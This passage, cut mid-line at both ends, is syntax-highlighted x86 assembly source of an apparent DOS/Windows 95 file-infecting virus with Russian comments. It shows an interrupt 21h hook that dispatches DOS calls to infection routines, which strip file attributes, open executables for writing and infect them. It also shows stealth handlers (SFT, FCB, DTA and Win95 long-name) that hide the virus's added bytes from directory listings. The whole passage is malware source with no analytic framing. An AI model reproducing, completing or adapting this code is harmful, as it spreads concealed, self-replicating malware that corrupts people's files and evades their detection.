        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">D</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">io21p</span><span class="sc0">      </span><span class="sc1">; иначе мы тут ни при чем</span><span class="sc0">

 </span><span class="sc5">manager</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">        </span><span class="sc1">; сохранить все регистры</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">save_ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">   </span><span class="sc1">; соохранение параметров</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">save_bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">   </span><span class="sc1">; будут использоваться (Filename), если</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">save_es</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">   </span><span class="sc1">; функция = 4b00 и заппускаемый файл - AV</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">funcs</span><span class="sc0">        </span><span class="sc1">; есть табличка, по которой обрабатываются</span><span class="sc0">
 </span><span class="sc5">fscan</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; нужные функции int 21 (db F#, dw offset)</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">lnext</span><span class="sc0">           </span><span class="sc1">; сравниваем al с текущей ячейкой таблицы</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">B</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0ffh</span><span class="sc0">  </span><span class="sc1">; проверка на ненужность проверки подфункции</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ljump</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">B</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">; проверка подфункции</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">lnext</span><span class="sc0">

 </span><span class="sc5">ljump</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">mcbcheck</span><span class="sc0">        </span><span class="sc1">; функция найдена: проверка MCB (для stealth)</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">W</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; берем смещение обработчика для функции</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">LoadRegs</span><span class="sc0">        </span><span class="sc1">; восстанавливаем регистры</span><span class="sc0">

 </span><span class="sc5">lnext</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">            </span><span class="sc1">; берем следующую запись из таблицы</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">w</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; проверка конца таблицы</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">fscan</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadRegs</span><span class="sc0">        </span><span class="sc1">; обработчик для этой функции так и не</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ExitHandler</span><span class="sc0">     </span><span class="sc1">; найден: отдаем управление</span><span class="sc0">

 </span><span class="sc5">exithandler</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">  </span><span class="sc1">; сохранение ES:BX и резервирование места</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_dup</span><span class="sc0">         </span><span class="sc1">; получение оригинального вектора int 21h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">       </span><span class="sc1">; занос вектора в две свободные ячейки</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">       </span><span class="sc1">; в стеке</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">        </span><span class="sc1">; восстановление регистров ES:BX</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">                    </span><span class="sc1">; передача управления DOS</span><span class="sc0">

 </span><span class="sc5">ireturn</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">               </span><span class="sc1">; возврат с уничтожением флагов в стеке</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; Заражение файлов</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">extlfninf</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">        </span><span class="sc1">; сохранить в стеке регистры</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">lfnbreak</span><span class="sc0">

 </span><span class="sc5">lfninfect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">        </span><span class="sc1">; сохранить в стеке регистры</span><span class="sc0">

 </span><span class="sc5">lfnbreak</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Hook24</span><span class="sc0">          </span><span class="sc1">; установка 24-го вектора прерывания</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Filename</span><span class="sc0">        </span><span class="sc1">; проверка имени и расширения файла</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">noinf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LFNClrAttrib</span><span class="sc0">    </span><span class="sc1">; очистка аттрибутов файла</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">noinf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LFNOpenFile</span><span class="sc0">     </span><span class="sc1">; открытие файла для R/W</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">LFNga</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Infect_Handle</span><span class="sc0">   </span><span class="sc1">; инфицирование handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseFile</span><span class="sc0">       </span><span class="sc1">; закрытие файла</span><span class="sc0">
 </span><span class="sc5">LFNga</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LFNRestAttrib</span><span class="sc0">   </span><span class="sc1">; восстановление аттрибутов файла</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">noinf</span><span class="sc0">

 </span><span class="sc5">extinfect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">        </span><span class="sc1">; сохранить в стеке регистры</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">break</span><span class="sc0">
 </span><span class="sc5">infect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">        </span><span class="sc1">; сохранить в стеке регистры</span><span class="sc0">
 </span><span class="sc5">break</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Hook24</span><span class="sc0">          </span><span class="sc1">; установка 24-го вектора прерывания</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Filename</span><span class="sc0">        </span><span class="sc1">; проверка имени и расширения файла</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">noinf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ClrAttrib</span><span class="sc0">       </span><span class="sc1">; очистка аттрибутов файла</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">noinf</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OpenFile</span><span class="sc0">        </span><span class="sc1">; открытие файла для R/W</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">RAttr</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Infect_Handle</span><span class="sc0">   </span><span class="sc1">; инфицирование handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseFile</span><span class="sc0">       </span><span class="sc1">; закрытие файла</span><span class="sc0">
 </span><span class="sc5">Rattr</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">RestAttrib</span><span class="sc0">      </span><span class="sc1">; восстановление аттрибутов файла</span><span class="sc0">
 </span><span class="sc5">Noinf</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Remove24</span><span class="sc0">        </span><span class="sc1">; восстановление обработчика int 24h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadRegs</span><span class="sc0">        </span><span class="sc1">; восстановление регистров</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3dh</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">sftstealth</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">6c00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">sftstealth</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">exithandler</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; SFT stealth</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">sftstealth</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">           </span><span class="sc1">; открыть нужный файл</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">        </span><span class="sc1">; сохранение регистров</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">no_sft</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseSFT</span><span class="sc0">        </span><span class="sc1">; закрыть SFT</span><span class="sc0">
 </span><span class="sc5">no_sft</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadRegs</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ireturn</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; FCB stealth</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">fcbstealth</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">           </span><span class="sc1">; вызвать функцию DOS</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">        </span><span class="sc1">; сохранение регистров</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">         </span><span class="sc1">; найдено что-нибудь?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_fcb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stf</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; работать можно?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_fcb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">command</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; это запрос command.com'а?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_fcb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">          </span><span class="sc1">; запрос адреса DTA</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc5">B</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">0ffh</span><span class="sc0">  </span><span class="sc1">; расширенное FCB?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">usual</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">7</span><span class="sc0">
 </span><span class="sc5">usual</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; si -&gt; дата файла</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1Dh</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; di -&gt; длина файла</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sizst</span><span class="sc0">           </span><span class="sc1">; скрытие лишних байт</span><span class="sc0">
 </span><span class="sc5">no_fcb</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadRegs</span><span class="sc0">        </span><span class="sc1">; восстановление регистров</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ireturn</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; DTA stealth</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">dtastealth</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">           </span><span class="sc1">; вызвать функцию DOS</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">        </span><span class="sc1">; сохранение регистров</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">no_dta</span><span class="sc0">          </span><span class="sc1">; нашли?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stf</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; работать можно?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_dta</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">          </span><span class="sc1">; запрос адреса DTA</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; si -&gt; дата файла</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1ah</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; di -&gt; длина файла</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sizst</span><span class="sc0">           </span><span class="sc1">; скрытие лишних байт</span><span class="sc0">
 </span><span class="sc5">no_dta</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">LoadRegs</span><span class="sc0">        </span><span class="sc1">; восстановление регистров</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ireturn</span><span class="sc0">

▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
</span><span class="sc1">; Win95 stealth</span><span class="sc0">
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
 </span><span class="sc5">infstealth</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">                     </span><span class="sc1">; CF должен быть установлен</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">           </span><span class="sc1">; вызвать функцию DOS</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">        </span><span class="sc1">; сохранение регистров</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">no_win</span><span class="sc0">          </span><span class="sc1">; все ok?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stf</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; работать можно?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_win</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; время в Win95 формате</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; размер файла</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; дата файла</span><span class="sc0">
        </span><span class="sc5">mvs</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">allw95</span><span class="sc0">

 </span><span class="sc5">lfnstealth</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">           </span><span class="sc1">; вызвать функцию DOS</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SaveRegs</span><span class="sc0">        </span><span class="sc1">; сохранение регистров</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">no_win</span><span class="sc0">          </span><span class="sc1">; нашли?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">stf</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">; работать можно?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">no_win</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">           </span><span class="sc1">; формат времени</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; дата файла</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; размер файла</span><span class="sc0">

 </span><span class="sc5">allw95</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; проверка формата времени</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">dos_date</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">        </span><span class="sc1">; сохранение параметров на будующее</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">71a7h</span><span class="sc0">        </span><span class="sc1">; перевод времени из формата</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">            </span><span class="sc1">; Win95 в формат DOS</span><span class="sc0">
        </span><span class="sc5">mvs</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">es</span><span class="sc0">           </span><span class="sc1">; SI указывает на дату</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21</span><span class="sc0">           </span><span class="sc1">; сейчас CX:DX содержат обычное DOS время</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">        </span><span class="sc1">; восстановление параметров</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">cx</span><span class="sc0">         </span><span class="sc1">; сохранение параметров в FindDataRecord</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

 </span><span class="sc5">dos_date</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">            </span><span class="sc1">; si -&gt; дата файла</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">sizst</span><span class="sc0">           </span><span class="sc1">; di -&gt; длина файла</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; проверка формата времени</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">no_win</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">71a7h</span><span class="sc0">        </span><span class="sc1">; перевод времени из формата</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">; DOS в формат Win95</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">           </span><span class="sc1">; DI -&gt; buffer для времени и даты</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; чтение времени и даты в формате DOS</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
